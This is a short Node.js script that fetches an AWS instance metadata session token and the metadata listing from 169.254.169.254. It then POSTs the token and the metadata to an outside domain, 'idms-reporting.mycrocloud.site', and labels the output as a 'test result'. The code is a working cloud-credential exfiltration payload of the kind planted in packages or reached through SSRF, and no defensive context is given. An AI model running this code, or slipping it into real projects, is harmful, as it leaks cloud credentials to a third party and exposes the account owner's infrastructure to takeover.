import http from "http";
import https from "https";

const METADATA_HOST = "169.254.169.254";
const REPORT_HOST = "idms-reporting.mycrocloud.site";
const REPORT_PATH = "/api/v2";

function request({ protocol = "http:", ...options }, body = null) {
  const lib = protocol === "https:" ? https : http;

  return new Promise((resolve) => {
    const req = lib.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () =>
        resolve({
          ok: true,
          statusCode: res.statusCode,
          body: data,
        })
      );
    });

    req.on("error", (err) =>
      resolve({
        ok: false,
        error: err.message,
      })
    );

    req.setTimeout(3000, () => {
      req.destroy(new Error("Request timeout"));
    });

    if (body) req.write(body);
    req.end();
  });
}

async function run() {
  let result = "ok";
  const report = {
    timestamp: new Date().toISOString(),
    token: null,
    metadata: null,
    tokenError: null,
    metadataError: null,
  };

  // 1️⃣ Try get token
  const tokenRes = await request({
    protocol: "http:",
    host: METADATA_HOST,
    path: "/latest/api/token",
    method: "PUT",
    headers: {
      "X-aws-ec2-metadata-token-ttl-seconds": "60",
    },
  });

  if (tokenRes.ok && tokenRes.statusCode === 200) {
    report.token = tokenRes.body;
  } else {
    report.tokenError =
      tokenRes.error || `Status ${tokenRes.statusCode}`;
  }

  // 2️⃣ Try get metadata (only if token exists)
  if (report.token) {
    const metaRes = await request({
      protocol: "http:",
      host: METADATA_HOST,
      path: "/latest/meta-data/",
      method: "GET",
      headers: {
        "X-aws-ec2-metadata-token": report.token,
      },
    });

    if (metaRes.ok) {
      report.metadata = metaRes.body;
    } else {
      report.metadataError = metaRes.error;
    }
  }

  // 3️⃣ Always try POST report
  const postRes = await request(
    {
      protocol: "https:",
      host: REPORT_HOST,
      path: REPORT_PATH + (report.metadata ? "/ok" : "/error"),
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
    },
    JSON.stringify(report)
  );

  console.log("==== TEST RESULT ====");
  console.log(JSON.stringify(report, null, 2));
  console.log("POST status:", postRes.statusCode || postRes.error);
}

run();